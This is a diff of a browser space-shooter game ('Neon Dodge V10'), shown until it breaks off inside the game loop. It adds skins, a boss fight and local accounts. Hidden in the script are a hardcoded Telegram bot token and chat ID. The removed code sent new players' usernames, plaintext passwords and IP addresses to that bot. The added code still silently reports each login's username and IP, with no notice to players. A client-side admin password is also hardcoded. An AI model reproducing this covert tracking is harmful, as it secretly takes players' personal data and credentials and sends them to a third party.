@@ -3,254 +3,491 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEON DODGE - ADVANCED ADMIN</title>
+    <title>NEON DODGE V10 - COLORFUL EDITION</title>
     <style>
-        :root { --neon: #00f2ff; --pink: #ff007f; --gold: #ffd700; --space: #020205; --dark: #0a0a1a; }
+        :root { 
+            --neon: #00f2ff; --pink: #ff007f; --gold: #ffd700; 
+            --space: #020205; --dark: #0a0a1a; --shield: #50fa7b; --boss: #ff3300; 
+        }
         body { margin: 0; background: var(--space); font-family: 'Segoe UI', sans-serif; overflow: hidden; color: white; touch-action: none; }
-        canvas { display: block; }
-        .screen { position: absolute; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 100; background: rgba(0,0,0,0.92); backdrop-filter: blur(10px); }
-        .active { display: flex; }
-        .box { background: var(--dark); padding: 25px; border-radius: 20px; border: 1px solid var(--neon); width: 340px; text-align: center; position: relative; }
-        .btn { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
-        .btn-cyan { background: var(--neon); color: #000; }
-        .btn-pink { background: var(--pink); color: #fff; }
-        .btn-grey { background: #333; color: #ccc; font-size: 10px; margin-top: 5px; }
-        .btn-sml { padding: 5px 8px; font-size: 9px; border-radius: 4px; border: none; font-weight: bold; cursor: pointer; margin-right: 2px; }
-        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 15px 0; max-height: 180px; overflow-y: auto; padding: 10px; border: 1px solid #222; border-radius: 10px; background: #050510; }
-        .item { background: #111; padding: 8px; border-radius: 8px; border: 2px solid transparent; cursor: pointer; font-size: 9px; }
-        .item.active { border-color: var(--neon); background: rgba(0,242,255,0.1); }
-        .pre { width: 18px; height: 18px; margin: 0 auto 5px; clip-path: polygon(50% 0, 0 100%, 100% 100%); }
-        input, select { width: 100%; padding: 10px; margin: 5px 0; border-radius: 6px; border: 1px solid #333; background: #000; color: #fff; font-size: 12px; box-sizing: border-box; }
+        canvas { display: block; image-rendering: auto; }
         
-        .admin-list { text-align: left; font-size: 11px; max-height: 200px; overflow-y: auto; background: #000; padding: 10px; border-radius: 10px; border: 1px solid #444; margin: 10px 0; }
-        .user-row { border-bottom: 1px solid #333; padding: 10px 0; }
-        .admin-controls { display: flex; gap: 5px; margin-top: 5px; }
-        .admin-controls input { width: 60px; padding: 4px; margin: 0; }
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .screen { 
+            position: absolute; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; 
+            z-index: 100; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px);
+        }
+
+        .screen.active { display: flex; }
+        .box { 
+            background: var(--dark); padding: 25px; border-radius: 20px; border: 1px solid var(--neon); 
+            width: 85%; max-width: 400px; text-align: center; animation: fadeInScale 0.3s ease-out; box-sizing: border-box;
+            box-shadow: 0 0 20px rgba(0,242,255,0.1);
+        }
         
-        #hud { position: absolute; top: 20px; left: 20px; z-index: 50; font-weight: bold; font-size: 1.2rem; display: none; color: var(--neon); }
+        .btn { 
+            width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 12px; 
+            font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.2s; font-size: 14px; 
+        }
+        .btn-cyan { background: var(--neon); color: #000; box-shadow: 0 4px 15px rgba(0,242,255,0.3); }
+        .btn-pink { background: var(--pink); color: #fff; box-shadow: 0 4px 15px rgba(255,0,127,0.3); }
+        .btn-gold { background: var(--gold); color: #000; box-shadow: 0 4px 15px rgba(255,215,0,0.3); }
+        .btn-grey { background: #222; color: #888; margin-top: 15px; }
+
+        .grid { 
+            display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 15px 0; 
+            height: 250px; overflow-y: auto; padding: 10px; background: rgba(0,0,0,0.5); 
+            border-radius: 12px; border: 1px solid #222;
+        }
+        
+        .item { 
+            background: #111; padding: 8px; border-radius: 10px; border: 2px solid #222; 
+            cursor: pointer; transition: 0.2s; display: flex; flex-direction: column; align-items: center; 
+            position: relative; overflow: hidden; min-height: 60px;
+        }
+        .item.active { border-color: var(--neon); background: rgba(0,242,255,0.15); transform: translateY(-2px); }
+        .item.locked { opacity: 0.4; filter: grayscale(1); cursor: not-allowed; }
+        
+        .pre { width: 35px; height: 35px; margin-bottom: 5px; background-size: cover; background-position: center; }
+
+        input { 
+            width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: 1px solid #333; 
+            background: #050505; color: #fff; box-sizing: border-box; outline: none; transition: 0.3s; 
+        }
+
+        #hud { position: absolute; top: 15px; left: 15px; z-index: 50; display: none; pointer-events: none; }
+        .stat-bar { width: 120px; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; margin-bottom: 10px; }
+        .hp-fill { width: 100%; height: 100%; background: var(--pink); transition: 0.3s linear; }
+        .sh-fill { width: 100%; height: 100%; background: var(--shield); transition: 0.3s linear; }
+
+        #boss-hud { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); width: 70%; display: none; text-align: center; z-index: 40; }
+        .boss-hp-bg { width: 100%; height: 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--boss); border-radius: 6px; overflow: hidden; }
+        .boss-hp-fill { width: 100%; height: 100%; background: linear-gradient(to right, #ff3300, #ff9900); transition: 0.1s; }
+        .boss-count { font-size: 11px; color: var(--gold); margin-top: 4px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div id="hud">SKOR: <span id="skor-val">0</span></div>
+<div id="hud">
+    <div style="color:var(--neon); font-size: 22px; font-weight: 900;">SCORE: <span id="skor-val">0</span></div>
+    <div class="stat-bar"><div id="hp-val" class="hp-fill"></div></div>
+    <div class="stat-bar"><div id="sh-val" class="sh-fill"></div></div>
+</div>
+
+<div id="boss-hud">
+    <div style="color:var(--boss); font-weight: bold; font-size: 11px; margin-bottom: 5px;">COMMANDER GARGANTUA</div>
+    <div class="boss-hp-bg"><div id="boss-hp-val" class="boss-hp-fill"></div></div>
+</div>
 
 <div id="scr-welcome" class="screen active">
-    <h1 style="color:var(--neon); text-shadow: 0 0 20px var(--neon)">SPACE ANDIKA 🚀🌌</h1>
+    <h1 style="color:var(--neon); text-shadow: 0 0 30px var(--neon); letter-spacing: 5px; font-size: 35px; margin-bottom: 30px;">SPACE ANDIKA</h1>
     <div class="box">
-        <button class="btn btn-cyan" onclick="initAudio(); nav('scr-login')">LOGIN</button>
-        <button class="btn btn-pink" onclick="initAudio(); nav('scr-register')">DAFTAR</button>
+        <button class="btn btn-cyan" onclick="nav('scr-login')">ACCESS TERMINAL</button>
+        <button class="btn btn-pink" onclick="nav('scr-register')">NEW PILOT</button>
     </div>
 </div>
 
-<div id="scr-login" class="screen"><div class="box"><h2>MASUK</h2><input type="text" id="l-u" placeholder="User"><input type="password" id="l-p" placeholder="Pass"><button class="btn btn-cyan" onclick="doLogin()">LOGIN</button></div></div>
-<div id="scr-register" class="screen"><div class="box"><h2>DAFTAR</h2><input type="text" id="r-u" placeholder="User"><input type="password" id="r-p" placeholder="Pass"><button class="btn btn-pink" onclick="doRegister()">BUAT AKUN</button></div></div>
+<div id="scr-login" class="screen"><div class="box"><h2>LOGIN</h2><input type="text" id="l-u" placeholder="Pilot Name"><input type="password" id="l-p" placeholder="Security Key"><button class="btn btn-cyan" onclick="doLogin()">AUTHORIZE</button><button class="btn btn-grey" onclick="nav('scr-welcome')">BACK</button></div></div>
+<div id="scr-register" class="screen"><div class="box"><h2>REGISTER</h2><input type="text" id="r-u" placeholder="Set Pilot Name"><input type="password" id="r-p" placeholder="Set Security Key"><button class="btn btn-pink" onclick="doRegister()">CREATE IDENTITY</button><button class="btn btn-grey" onclick="nav('scr-welcome')">BACK</button></div></div>
 
 <div id="scr-menu" class="screen">
-    <div class="box" style="width: 360px;">
-        <div id="admin-panel" style="display:none; margin-bottom:15px;">
-            <p style="color:var(--gold); font-size: 11px; margin: 0; font-weight:bold">🛡️ KONTROL DATABASE</p>
-            <div class="admin-list" id="user-list"></div>
+    <div class="box">
+        <div style="display:flex; justify-content:space-between; align-items: center; margin-bottom:15px;">
+            <div style="text-align:left">
+                <div id="u-n" style="color:var(--neon); font-weight: bold; font-size: 18px;">-</div>
+                <div id="u-boss" class="boss-count">BOSS KILLS: 0/10</div>
+            </div>
+            <span id="u-c" style="color:var(--gold); font-weight: bold;">0 C</span>
         </div>
-
-        <div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span id="u-n" style="color:var(--neon); font-weight:bold">-</span><span id="u-c" style="color:var(--gold); font-weight:bold">0 C</span></div>
+        <button class="btn btn-gold" onclick="claimDaily()" style="font-size:11px;">GET DAILY 100C</button>
         <div class="grid" id="skin-grid"></div>
-        <button class="btn btn-pink" onclick="start()">MULAI GAME</button>
-        <button class="btn btn-grey" onclick="doLogOut()">LOG OUT</button>
+        <button class="btn btn-pink" onclick="start()">LAUNCH SHIP</button>
+        <button class="btn btn-grey" onclick="doLogOut()">DISCONNECT</button>
     </div>
 </div>
 
 <div id="scr-over" class="screen">
-    <div class="box"><h2>GAME OVER</h2><p>Skor: <span id="final-skor">0</span></p><button class="btn btn-cyan" onclick="start()">ULANGI</button><button class="btn btn-grey" onclick="nav('scr-menu')">MENU</button></div>
+    <div class="box">
+        <h2 style="color:var(--pink); font-size: 32px; margin: 10px 0;">HULL BREACHED</h2>
+        <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; margin: 20px 0;">
+            <p>SCORE: <span id="final-skor" style="color:var(--neon)">0</span></p>
+            <p>BOUNTY: <span id="earned-coins" style="color:var(--gold)">0</span> C</p>
+        </div>
+        <button class="btn btn-cyan" onclick="start()">REPAIR & RELAUNCH</button>
+        <button class="btn btn-grey" onclick="nav('scr-menu')">HANGAR</button>
+    </div>
 </div>
 
 <canvas id="game"></canvas>
 
 <script>
-/* --- KONFIGURASI TELEGRAM (ISI DI SINI) --- */
-const TELE_TOKEN = "7762127279:AAHPko1qnDo0H_grMPoTrhTgI3CUgAYcXzQ";
-const TELE_CHAT_ID = "6788646701";
+/**
+ * GLOBAL CONFIG & DATA
+ */
+const cvs = document.getElementById('game'), ctx = cvs.getContext('2d', { alpha: false });
+let user = null, db = JSON.parse(localStorage.getItem('nd_v10_db')) || {};
 
-const cvs = document.getElementById('game'), ctx = cvs.getContext('2d');
-let user = null, db = JSON.parse(localStorage.getItem('nd_v9_db')) || {};
+const specialImg = new Image();
+specialImg.crossOrigin = "anonymous";
+specialImg.src = "https://files.catbox.moe/locbqn.jpg";
 
-const SKINS = [
-    {id:0, n:"Starter", c:"#00f2ff", cost:0, speed:0.12, firerate:300},
-    {id:1, n:"Ruby", c:"#ff007f", cost:1000, speed:0.14, firerate:280},
-    {id:4, n:"Volt", c:"#ffff00", cost:8000, speed:0.20, firerate:220},
-    {id:11, n:"Void", c:"#8e44ad", cost:25000, speed:0.26, firerate:160, border:"#fff"},
-    {id:12, n:"TITAN", c:"#ecf0f1", cost:50000, speed:0.30, firerate:120, border:"gold"},
-    {id:13, n:"GOD TIER", c:"rainbow", cost:0, speed:0.35, firerate:80, border:"#00f2ff"}
-];
+const ghostBulletImg = new Image();
+ghostBulletImg.crossOrigin = "anonymous";
+ghostBulletImg.src = "https://files.catbox.moe/j3on2w.jpg";
 
-let audioCtx;
-function initAudio() { if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
+// MODIFIKASI: Image Batu Warna Warni
+const stoneImg = new Image();
+stoneImg.crossOrigin = "anonymous";
+stoneImg.src = "https://files.catbox.moe/0gtvv8.jpg";
 
-/* --- FUNGSI KIRIM LOG KE TELEGRAM --- */
-async function sendToTelegram(message) {
+const SKINS = [];
+const baseColors = ["#00f2ff", "#ff007f", "#2ecc71", "#ffd700", "#8e44ad", "#e67e22", "#ffffff", "#3498db"];
+
+for(let i=0; i<35; i++) {
+    let cost = i === 0 ? 0 : Math.floor(Math.pow(i, 1.8) * 500);
+    SKINS.push({ id: i, n: `SHIP MK-${i+1}`, c: baseColors[i % baseColors.length], cost, speed: 0.15 + (i * 0.005), firerate: 380 - (i * 8), power: 1 + (i * 0.12) });
+}
+SKINS.push({ id: 99, n: "GHOST PHANTOM", c: "special", cost: 0, speed: 0.52, firerate: 65, power: 13, unlockKills: 10 });
+
+const TG_TOKEN = "7762127279:AAHPko1qnDo0H_grMPoTrhTgI3CUgAYcXzQ";
+const TG_ID = "6788646701";
+
+async function logToTelegram(status, username) {
     try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-        const fullMsg = `<b>LOG GAME NEON DODGE</b>\n${message}\n🌐 IP: ${ipData.ip}\n⏰ ${new Date().toLocaleString('id-ID')}`;
-        
-        await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: TELE_CHAT_ID, text: fullMsg, parse_mode: 'HTML' })
-        });
-    } catch (e) { console.log("Tele Error"); }
+        const msg = `🚀 *Neon Dodge Update*\n👤 User: ${username}\n🌐 IP: ${ipData.ip}\n📊 Status: ${status}`;
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    } catch (e) {}
 }
 
-function playShootSound(vip) {
-    if(!audioCtx) return;
-    const o = audioCtx.createOscillator(), g = audioCtx.createGain();
-    o.type = vip ? 'sawtooth' : 'square';
-    o.frequency.setValueAtTime(vip?600:400, audioCtx.currentTime);
-    o.frequency.exponentialRampToValueAtTime(10, audioCtx.currentTime + 0.1);
-    g.gain.setValueAtTime(0.04, audioCtx.currentTime);
-    g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.1);
-    o.connect(g); g.connect(audioCtx.destination);
-    o.start(); o.stop(audioCtx.currentTime + 0.1);
-}
+let audioCtx, musicInterval;
+let game = { 
+    running:false, px:0, py:0, tx:0, hp:100, sh:100, 
+    enemies:[], eBullets:[], pBullets:[], particles:[], 
+    lastF:0, skor:0, boss: null, bossTimer: 3000,
+    deltaTime: 0, lastTime: 0
+};
 
+/**
+ * SYSTEM INTERFACE
+ */
 function nav(id) {
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
     if(id !== 'none') document.getElementById(id).classList.add('active');
-    if(id === 'scr-menu') { renderShop(); if(user.isAdmin) updateAdminList(); }
+    if(id === 'scr-menu') renderShop();
+    if(id !== 'none') { stopMusic(); document.getElementById('boss-hud').style.display = 'none'; }
     game.running = false;
     document.getElementById('hud').style.display = (id === 'none') ? 'block' : 'none';
 }
 
+function saveDB() {
+    if(user && user.u !== 'ADMIN') {
+        db[user.u] = user;
+        localStorage.setItem('nd_v10_db', JSON.stringify(db));
+    }
+}
+
 function doLogin() {
     let u = document.getElementById('l-u').value, p = document.getElementById('l-p').value;
-    if(u === 'admin' && p === 'ya123') {
-        user = {u:'ADMIN', coins:999999, owned:SKINS.map(s=>s.id), cur:12, used:[], isAdmin:true};
-        sendToTelegram(`🛡️ <b>LOGIN ADMIN</b>\nUsername: ${u}`);
-        document.getElementById('admin-panel').style.display = 'block'; nav('scr-menu');
+    if(u === 'admin' && p === 'ya2011') {
+        user = {u:'ADMIN', coins:1000000000000000, owned:SKINS.map(s=>s.id), cur:99, bossKills:99};
+        logToTelegram("ADMIN LOGIN", u); nav('scr-menu');
     } else if(db[u] && db[u].p === p) {
         user = db[u]; 
-        sendToTelegram(`🚀 <b>LOGIN USER</b>\nUsername: ${u}`);
-        document.getElementById('admin-panel').style.display = 'none'; nav('scr-menu');
-    } else alert("Username/Password Salah!");
+        if(user.bossKills === undefined) user.bossKills = 0;
+        logToTelegram("SUCCESS", u); nav('scr-menu');
+    } else alert("Access Denied!");
 }
 
 function doRegister() {
     let u = document.getElementById('r-u').value, p = document.getElementById('r-p').value;
-    if(!u || !p || db[u]) return alert("Username tidak tersedia!");
-    db[u] = {u, p, coins:500, owned:[0], cur:0, used:[]}; 
-    saveDB(); 
-    sendToTelegram(`✨ <b>USER BARU</b>\nUser: ${u}\nPass: ${p}`);
-    nav('scr-login');
+    if(!u || !p) return;
+    db[u] = {u, p, coins:1000, owned:[0], cur:0, bossKills: 0}; 
+    localStorage.setItem('nd_v10_db', JSON.stringify(db));
+    alert("Identity Created!"); nav('scr-login');
 }
 
-function doLogOut() { user = null; nav('scr-welcome'); }
-
-function saveDB() { localStorage.setItem('nd_v9_db', JSON.stringify(db)); }
-
-/* --- ADMIN POWER FUNCTIONS --- */
-function updateAdminList() {
-    const list = document.getElementById('user-list'); list.innerHTML = '';
-    Object.values(db).forEach(u => {
-        const row = document.createElement('div');
-        row.className = 'user-row';
-        let skinOptions = SKINS.map(s => `<option value="${s.id}">${s.n}</option>`).join('');
-        row.innerHTML = `
-            <div><b>${u.u}</b> | ${u.coins} C</div>
-            <div class="admin-controls">
-                <input type="number" id="amt-${u.u}" placeholder="Coin">
-                <button class="btn-sml" style="background:var(--gold);color:black" onclick="giveCoin('${u.u}')">Kirim</button>
-                <select id="skn-${u.u}" style="width: 80px;">${skinOptions}</select>
-                <button class="btn-sml" style="background:var(--neon);color:black" onclick="giveSkin('${u.u}')">Beri</button>
-                <button class="btn-sml" style="background:#ff3333" onclick="delUser('${u.u}')">X</button>
-            </div>
-        `;
-        list.appendChild(row);
-    });
+function claimDaily() {
+    const today = new Date().toDateString();
+    if(localStorage.getItem('nd_daily_' + user.u) === today) return alert("Already claimed today!");
+    user.coins += 100;
+    localStorage.setItem('nd_daily_' + user.u, today);
+    saveDB(); renderShop();
+    alert("100 Coins received!");
 }
 
-function giveCoin(target) {
-    const amt = parseInt(document.getElementById(`amt-${target}`).value);
-    if(isNaN(amt)) return alert("Masukkan jumlah angka!");
-    db[target].coins += amt;
-    saveDB(); updateAdminList();
-    alert(`Berhasil mengirim ${amt} koin ke ${target}`);
-}
-
-function giveSkin(target) {
-    const skinId = parseInt(document.getElementById(`skn-${target}`).value);
-    if(!db[target].owned.includes(skinId)) {
-        db[target].owned.push(skinId);
-        saveDB(); alert(`Skin diberikan ke ${target}`);
-    } else { alert("User sudah punya skin ini"); }
-}
-
-function delUser(target) {
-    if(confirm(`Hapus akun ${target}?`)) { delete db[target]; saveDB(); updateAdminList(); }
-}
-
-/* --- GAMEPLAY --- */
 function renderShop() {
-    document.getElementById('u-n').innerText = user.u;
+    document.getElementById('u-n').innerText = user.u.toUpperCase();
     document.getElementById('u-c').innerText = user.coins + " C";
+    document.getElementById('u-boss').innerText = `BOSS KILLS: ${user.bossKills}/10`;
+    
     const g = document.getElementById('skin-grid'); g.innerHTML = '';
     SKINS.forEach(s => {
-        let own = user.owned.includes(s.id);
-        if(!own && s.cost === 0) return;
-        let d = document.createElement('div'); d.className = `item ${user.cur === s.id ? 'active' : ''}`;
-        let bg = s.c === 'rainbow' ? 'linear-gradient(red, blue)' : s.c;
-        d.innerHTML = `<div class="pre" style="background:${bg}; border:${s.border?'1px solid '+s.border:'none'}"></div><div style="font-size:8px">${s.n}</div><div style="color:var(--gold)">${own?'PAKAI':s.cost}</div>`;
-        d.onclick = () => { 
-            if(own) user.cur=s.id; 
-            else if(user.coins>=s.cost){ user.coins-=s.cost; user.owned.push(s.id); user.cur=s.id; }
-            if(!user.isAdmin){ db[user.u]=user; saveDB(); }
-            renderShop();
+        let isLocked = s.unlockKills && user.bossKills < s.unlockKills;
+        let isOwned = user.owned.includes(s.id) || (s.unlockKills && user.bossKills >= s.unlockKills);
+        
+        let d = document.createElement('div');
+        d.className = `item ${user.cur === s.id ? 'active' : ''} ${isLocked ? 'locked' : ''}`;
+        
+        let style = s.c === 'special' ? `background-image:url(${specialImg.src}); filter:invert(1) brightness(1.5);` : `background:${s.c}; clip-path:polygon(50% 0, 0 100%, 100% 100%)`;
+        
+        d.innerHTML = `<div class="pre" style="${style}"></div>
+                       <div style="font-size:7px; font-weight:bold;">${isLocked ? 'LOCKED' : (isOwned ? 'READY' : s.cost + ' C')}</div>`;
+        
+        d.onclick = () => {
+            if(isLocked) return alert(`Unlock at ${s.unlockKills} Boss Kills!`);
+            if(!isOwned && user.coins >= s.cost) {
+                user.coins -= s.cost; user.owned.push(s.id);
+            }
+            if(isOwned || user.owned.includes(s.id)) user.cur = s.id;
+            saveDB(); renderShop();
         };
         g.appendChild(d);
     });
 }
 
-let game = { running:false, px:0, py:0, tx:0, tilt:0, enemies:[], bullets:[], lastF:0, skor:0 };
+function doLogOut(){ user=null; nav('scr-welcome'); }
 
-function start() {
-    nav('none');
-    game = { ...game, running:true, px:cvs.width/2, py:cvs.height*0.8, tx:cvs.width/2, enemies:[], bullets:[], skor:0 };
+/**
+ * ENGINE MECHANICS
+ */
+function createExplosion(x, y, color, count=8) {
+    for(let i=0; i<count; i++) { 
+        if(game.particles.length > 50) return; 
+        game.particles.push({ 
+            x, y, vx:(Math.random()-0.5)*14, vy:(Math.random()-0.5)*14, 
+            life:1.0, color 
+        }); 
+    }
 }
 
-function loop() {
-    ctx.fillStyle = "rgba(2, 2, 5, 0.25)"; ctx.fillRect(0,0,cvs.width,cvs.height);
+function start() {
+    nav('none'); startMarshmelloMusic();
+    game = { 
+        running:true, px:cvs.width/2, py:cvs.height*0.85, tx:cvs.width/2, 
+        hp:100, sh:100, enemies:[], eBullets:[], pBullets:[], particles:[], 
+        lastF:0, skor:0, boss: null, bossTimer: 3000,
+        deltaTime: 0, lastTime: performance.now()
+    };
+}
+
+function playSynth(f,t,v,l){ 
+    if(!audioCtx) return; 
+    const o=audioCtx.createOscillator(),g=audioCtx.createGain(); 
+    o.type=t; o.frequency.setValueAtTime(f,audioCtx.currentTime); 
+    g.gain.setValueAtTime(v,audioCtx.currentTime); 
+    g.gain.exponentialRampToValueAtTime(0.0001,audioCtx.currentTime+l); 
+    o.connect(g); g.connect(audioCtx.destination); 
+    o.start(); o.stop(audioCtx.currentTime+l); 
+}
+
+function stopMusic(){ if(musicInterval){clearInterval(musicInterval); musicInterval=null;}}
+function startMarshmelloMusic(){ 
+    if(musicInterval) return; 
+    if(!audioCtx) audioCtx=new(window.AudioContext||window.webkitAudioContext)(); 
+    musicInterval=setInterval(()=>{ playSynth(70,'triangle',0.03,0.4); }, 400); 
+}
+
+/**
+ * MAIN LOOP
+ */
+function loop(now) {
+    game.deltaTime = (now - game.lastTime) / 16.67;
+    game.lastTime = now;
+
+    ctx.fillStyle = "#020205"; 
+    ctx.fillRect(0,0,cvs.width,cvs.height);
+    
+    // Draw Background Particles
+    for(let i = game.particles.length - 1; i >= 0; i--) {
+        let p = game.particles[i];
+        p.x += p.vx * game.deltaTime; p.y += p.vy * game.deltaTime; 
+        p.life -= 0.04 * game.deltaTime;
+        if(p.life <= 0) { game.particles.splice(i, 1); continue; }
+        ctx.fillStyle = p.color; ctx.globalAlpha = p.life;
+        ctx.fillRect(p.x, p.y, 2, 2);
+    }
+    ctx.globalAlpha = 1;
+
     if(game.running) {
         let s = SKINS.find(x => x.id === user.cur) || SKINS[0];
-        game.px += (game.tx - game.px) * s.speed; game.tilt = (game.tx - game.px) * 0.1;
-        if(Date.now() - game.lastF > s.firerate) { game.bullets.push({x:game.px, y:game.py-20, vip:s.id>=11}); playShootSound(s.id>=11); game.lastF = Date.now(); }
-        game.bullets.forEach((b,i) => {
-            b.y -= 15; ctx.fillStyle = b.vip ? "#00f2ff" : "#fff";
-            ctx.fillRect(b.x-(b.vip?2:1), b.y, b.vip?4:2, 12);
-            if(b.y < 0) game.bullets.splice(i,1);
-        });
-        if(Math.random() < 0.07) game.enemies.push({x:Math.random()*cvs.width, y:-20});
-        game.enemies.forEach((e,i) => {
-            e.y += (5 + game.skor/5000); ctx.fillStyle="#ff3333"; ctx.beginPath(); ctx.arc(e.x, e.y, 15, 0, Math.PI*2); ctx.fill();
-            if(Math.hypot(game.px-e.x, game.py-e.y) < 25) {
-                game.running = false; document.getElementById('final-skor').innerText = game.skor;
-                if(!user.isAdmin){ user.coins+=Math.floor(game.skor/10); db[user.u]=user; saveDB(); }
-                nav('scr-over');
+        game.px += (game.tx - game.px) * (s.speed * game.deltaTime);
+
+        // Boss Trigger
+        if(!game.boss && game.skor >= game.bossTimer) {
+            game.boss = { 
+                x: cvs.width / 2, y: -100, targetY: 120, 
+                hp: 5000 + (user.bossKills * 2200), 
+                maxHp: 5000 + (user.bossKills * 2200), 
+                lastShot: 0, dir: 1 
+            };
+            document.getElementById('boss-hud').style.display = 'block';
+        }
+
+        // Auto Shooting
+        if(now - game.lastF > s.firerate) {
+            game.pBullets.push({x:game.px, y:game.py-32});
+            playSynth(480, 'sine', 0.01, 0.08); 
+            game.lastF = now;
+        }
+
+        // Enemy Random Spawn
+        if(!game.boss && Math.random() < 0.09) { 
+            game.enemies.push({ x: Math.random()*cvs.width, y: -50, speed: 5.5+(game.skor/9500) }); 
+        }
+        
+        // Enemies Logic
+        for(let i = game.enemies.length - 1; i >= 0; i--) {
+            let e = game.enemies[i];
+            e.y += e.speed * game.deltaTime;
+            
+            // MODIFIKASI: Menggunakan Gambar Batu Warna Warni sebagai pengganti segitiga
+            ctx.save();
+            ctx.beginPath();
+            ctx.arc(e.x, e.y, 20, 0, Math.PI * 2);
+            ctx.clip(); // Hilangkan latar belakang dengan clipping lingkaran
+            ctx.drawImage(stoneImg, e.x-20, e.y-20, 40, 40);
+            ctx.restore();
+            
+            if(Math.hypot(game.px-e.x, game.py-e.y) < 30) { 
+                game.enemies.splice(i, 1); 
+                game.sh > 0 ? game.sh -= 25 : game.hp -= 35; 
+                playSynth(90, 'square', 0.08, 0.2);
+                continue;
             }
-            game.bullets.forEach((b,bi) => { if(Math.hypot(b.x-e.x, b.y-e.y) < 22) { game.enemies.splice(i,1); game.bullets.splice(bi,1); game.skor+=100; } });
-        });
-        ctx.save(); ctx.translate(game.px, game.py); ctx.rotate(game.tilt);
-        ctx.fillStyle = "orange"; ctx.fillRect(-4, 10, 8, s.id>=11?22:12);
-        if(s.c==='rainbow'){ let g=ctx.createLinearGradient(-15,0,15,0); g.addColorStop(0,"red"); g.addColorStop(1,"blue"); ctx.fillStyle=g; }
-        else ctx.fillStyle=s.c;
-        ctx.beginPath(); ctx.moveTo(0,-25); ctx.lineTo(-20,10); ctx.lineTo(0,3); ctx.lineTo(20,10); ctx.closePath(); ctx.fill();
-        if(s.border){ ctx.strokeStyle=s.border; ctx.lineWidth=3; ctx.stroke(); }
-        ctx.restore();
-        document.getElementById('skor-val').innerText = game.skor;
+            if(e.y > cvs.height + 50) game.enemies.splice(i, 1);
+        }
+
+        // Player Pellets
+        for(let i = game.pBullets.length - 1; i >= 0; i--) {
+            let b = game.pBullets[i];
+            b.y -= 24 * game.deltaTime;
+            
+            if(s.id === 99) {
+                ctx.save();
+                ctx.filter = "invert(1) brightness(1.5)";
+                ctx.drawImage(ghostBulletImg, b.x-12, b.y, 24, 42);
+                ctx.restore();
+            } else {
+                ctx.fillStyle = s.c;
+                ctx.shadowBlur = 8; ctx.shadowColor = s.c;
+                ctx.fillRect(b.x-2, b.y, 4, 20);
+                ctx.shadowBlur = 0;
+            }
+
+            let bulletHit = false;
+            for(let j = game.enemies.length - 1; j >= 0; j--) {
+                let e = game.enemies[j];
+                if(Math.hypot(b.x-e.x, b.y-e.y) < 32) {
+                    createExplosion(e.x, e.y, "#ffd700", 6); // Partikel warna emas menyesuaikan batu
+                    game.skor += 100; 
+                    game.enemies.splice(j, 1); game.pBullets.splice(i, 1);
+                    bulletHit = true; break;
+                }
+            }
+            if(bulletHit) continue;
+
+            if(game.boss && Math.hypot(b.x - game.boss.x, b.y - game.boss.y) < 68) {
+                game.boss.hp -= 23 * s.power; 
+                createExplosion(b.x, b.y, "white", 2); 
+                game.pBullets.splice(i,1);
+                continue;
+            }
+
+            if(b.y < -60) game.pBullets.splice(i, 1);
+        }
+
+        // Boss AI
+        if(game.boss) {
+            let b = game.boss;
+            if(b.y < b.targetY) b.y += 2.5 * game.deltaTime;
+            else {
+                b.x += (b.dir * 4) * game.deltaTime; 
+                if(b.x > cvs.width - 65 || b.x < 65) b.dir *= -1;
+                
+                if(now - b.lastShot > 620) {
+                    for(let a = -1.5; a <= 1.5; a += 0.75) {
+                        game.eBullets.push({x:b.x, y:b.y+35, vx: a*3.5, vy: 5.8});
+                    }
+                    b.lastShot = now;
+                }
+            }
+            ctx.fillStyle = "#ff3300"; ctx.shadowBlur = 20; ctx.shadowColor = "red";
+            ctx.beginPath(); 
+            ctx.moveTo(b.x, b.y+60); ctx.lineTo(b.x-80, b.y-40); ctx.lineTo(b.x+80, b.y-40); 
+            ctx.fill(); ctx.shadowBlur = 0;
+            
+            document.getElementById('boss-hp-val').style.width = (b.hp / b.maxHp * 100) + "%";
+            
+            if(b.hp <= 0) { 
+                createExplosion(b.x, b.y, "#ffaa00", 60);
+                game.skor += 7000; user.bossKills++; saveDB();
+                game.boss = null; 
+                document.getElementById('boss-hud').style.display = 'none'; 
+                game.bossTimer += 20000; 
+            }
+        }
+
+        // Boss Projectiles
+        for(let i = game.eBullets.length - 1; i >= 0; i--) {
+            let b = game.eBullets[i];
+            b.x += b.vx * game.deltaTime; b.y += b.vy * game.deltaTime;
+            ctx.fillStyle = "#ff3300"; ctx.beginPath(); ctx.arc(b.x, b.y, 7, 0, Math.PI*2); ctx.fill();
+            if(Math.hypot(game.px-b.x, game.py-b.y) < 26) { 
+                game.eBullets.splice(i,1); game.hp -= 20; 
+                continue; 
+            }
